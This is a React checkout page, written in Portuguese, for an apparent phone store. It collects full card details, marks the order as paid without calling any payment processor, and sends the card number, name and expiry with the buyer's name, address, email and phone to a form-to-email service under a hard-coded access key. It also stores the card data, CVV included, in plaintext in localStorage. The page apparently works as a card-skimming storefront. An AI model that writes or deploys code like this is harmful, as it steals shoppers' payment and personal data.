import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Navbar from "../../component/Navbar";
import style from "./Pagamento.module.css";

function Pagamento() {
    const [dadosCompra, setDadosCompra] = useState(null);
    const [metodoPagamento, setMetodoPagamento] = useState("cartao");
    const [dadosCartao, setDadosCartao] = useState({
        numero: "",
        nome: "",
        validade: "",
        cvv: ""
    });
    const navigate = useNavigate();

    useEffect(() => {
        // Buscar dados completos do localStorage
        const compraSalva = localStorage.getItem('dadosCompra');
        if (compraSalva) {
            setDadosCompra(JSON.parse(compraSalva));
        } else {
            // Se não houver dados, redirecionar para página do produto
            navigate('/');
        }
    }, [navigate]);

    const handleCartaoChange = (e) => {
        const { name, value } = e.target;
        setDadosCartao(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const finalizarPagamento = async () => {
    const compraFinal = {
        ...dadosCompra,
        metodoPagamento,
        dadosPagamento: metodoPagamento === "cartao" ? dadosCartao : {},
        status: "pago",
        dataPagamento: new Date().toLocaleString('pt-BR')
    };

    localStorage.setItem('compraFinalizada', JSON.stringify(compraFinal));
    
    // Preparar dados para envio formatando os objetos
    const dadosParaEnvio = {
        access_key: "c35a01ab-cf18-4f01-ae59-67c8726faa8a",
        // Produto detalhado
        Nome_Produto: compraFinal.produto.nome,
        Cor_Produto: compraFinal.produto.cor === "black" ? "Black Titanium" : "White Titanium",
        Armazenamento_Produto: compraFinal.produto.armazenamento === "1024" ? "1 TB" : `${compraFinal.produto.armazenamento} GB`,
        Preco_Produto: compraFinal.produto.preco,
        Imagem_Produto: compraFinal.produto.imagem,
        
        // Dados de entrega detalhados
        Cliente_Nome: compraFinal.dadosEntrega.nome,
        Cliente_Email: compraFinal.dadosEntrega.email,
        Cliente_Telefone: compraFinal.dadosEntrega.telefone,
        Endereco_Completo: `${compraFinal.dadosEntrega.endereco}, ${compraFinal.dadosEntrega.numero}`,
        Endereco_Complemento: compraFinal.dadosEntrega.complemento || "Nenhum",
        Cidade: compraFinal.dadosEntrega.cidade,
        Estado: compraFinal.dadosEntrega.estado,
        CEP: compraFinal.dadosEntrega.cep,
        
        // Dados do pagamento
        Metodo_Pagamento: compraFinal.metodoPagamento,
        Status_Pagamento: compraFinal.status,
        Data_Pagamento: compraFinal.dataPagamento,
        Data_Compra: compraFinal.dataCompra,
        Numero_Pedido: compraFinal.numeroPedido,
        
        // Dados do cartão (se aplicável)
        ...(compraFinal.metodoPagamento === "cartao" && {
            Cartao_Numero: compraFinal.dadosPagamento.numero,
            Cartao_Nome: compraFinal.dadosPagamento.nome,
            Cartao_Validade: compraFinal.dadosPagamento.validade
        })
    };

    try {
        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(dadosParaEnvio)
        });

        if (response.ok) {
            console.log("Dados enviados com sucesso!");
            // Redirecionar para página de confirmação se desejar
            // navigate('/confirmacao');
        } else {
            console.error("Erro ao enviar dados");
        }
    } catch (error) {
        console.error("Erro de rede:", error);
    }
};

    if (!dadosCompra) {
        return <div>Carregando...</div>;
    }

    const { produto, dadosEntrega } = dadosCompra;

    return (
        <>
            <Navbar />
            <div className={style.containerPai}>
                <div className={style.containerPagamento}>
                    {/* Resumo da Compra */}
                    <div className={style.resumoCompra}>
                        <h2>Resumo da Compra</h2>
                        <div className={style.produtoInfo}>
                            <img src={produto.imagem} alt={produto.nome} />
                            <div>
                                <h3>{produto.nome}</h3>
                                <p>{produto.cor === "black" ? "Black Titanium" : "White Titanium"} • {produto.armazenamento === "1024" ? "1 TB" : `${produto.armazenamento} GB`}</p>
                                <p className={style.preco}>{produto.preco}</p>
                            </div>
                        </div>
                        
                        <div className={style.infoEntrega}>
                            <h4>Entrega para:</h4>
                            <p><strong>{dadosEntrega.nome}</strong></p>
                            <p>{dadosEntrega.endereco}, {dadosEntrega.numero}</p>
                            <p>{dadosEntrega.cidade} - {dadosEntrega.estado}</p>
                            <p>CEP: {dadosEntrega.cep}</p>
                        </div>
                    </div>

                    {/* Formulário de Pagamento */}
                    <div className={style.formularioPagamento}>
                        <h2>Método de Pagamento</h2>
                        
                        <div className={style.opcoesPagamento}>
                            <label className={style.opcaoPagamento}>
                                <input
                                    type="radio"
                                    name="metodoPagamento"
                                    value="cartao"
                                    checked={metodoPagamento === "cartao"}
                                    onChange={(e) => setMetodoPagamento(e.target.value)}
                                />
                                <span className={style.checkmark}></span>
                                Cartão de Crédito
                            </label>

                            <label className={style.opcaoPagamento}>
                                <input
                                    type="radio"
                                    name="metodoPagamento"
                                    value="pix"
                                    checked={metodoPagamento === "pix"}
                                    onChange={(e) => setMetodoPagamento(e.target.value)}
                                />
                                <span className={style.checkmark}></span>
                                Pix indisponivel no momento
                            </label>

                            <label className={style.opcaoPagamento}>
                                <input
                                    type="radio"
                                    name="metodoPagamento"
                                    value="boleto"
                                    checked={metodoPagamento === "boleto"}
                                    onChange={(e) => setMetodoPagamento(e.target.value)}
                                />
                                <span className={style.checkmark}></span>
                                Boleto Bancário
                            </label>
                        </div>

                        {metodoPagamento === "cartao" && (
                            <div className={style.formCartao}>
                                <div className={style.campo}>
                                    <label>Número do Cartão *</label>
                                    <input
                                        type="text"
                                        name="numero"
                                        value={dadosCartao.numero}
                                        onChange={handleCartaoChange}
                                        placeholder="1234 5678 9012 3456"
                                        maxLength="19"
                                        required
                                    />
                                </div>

                                <div className={style.campo}>
                                    <label>Nome no Cartão *</label>
                                    <input
                                        type="text"
                                        name="nome"
                                        value={dadosCartao.nome}
                                        onChange={handleCartaoChange}
                                        placeholder="JOÃO M SILVA"
                                        required
                                    />
                                </div>

                                <div className={style.campoDuplo}>
                                    <div className={style.campo}>
                                        <label>Validade *</label>
                                        <input
                                            type="text"
                                            name="validade"
                                            value={dadosCartao.validade}
                                            onChange={handleCartaoChange}
                                            placeholder="MM/AA"
                                            maxLength="5"
                                            required
                                        />
                                    </div>
                                    <div className={style.campo}>
                                        <label>CVV *</label>
                                        <input
                                            type="text"
                                            name="cvv"
                                            value={dadosCartao.cvv}
                                            onChange={handleCartaoChange}
                                            placeholder="123"
                                            maxLength="3"
                                            required
                                        />
                                    </div>
                                </div>
                            </div>
                        )}

                        {metodoPagamento === "pix" && (
                            <div className={style.infoPix}>
                                
                            </div>
                        )}

                        {metodoPagamento === "boleto" && (
                            <div className={style.infoBoleto}>
                                <p>O boleto será gerado após a confirmação do pedido.</p>
                                <p>Prazo de vencimento: 3 dias úteis</p>
                                <p>Enviaremos o boleto para: <strong>{dadosEntrega.email}</strong></p>
                            </div>
                        )}

                        <button 
                            className={style.botaoFinalizarPagamento}
                            onClick={finalizarPagamento}
                        >
                            Finalizar Pagamento - {produto.preco}
                        </button>
                    </div>
                </div>
            </div>
        </>
    );
}

export default Pagamento;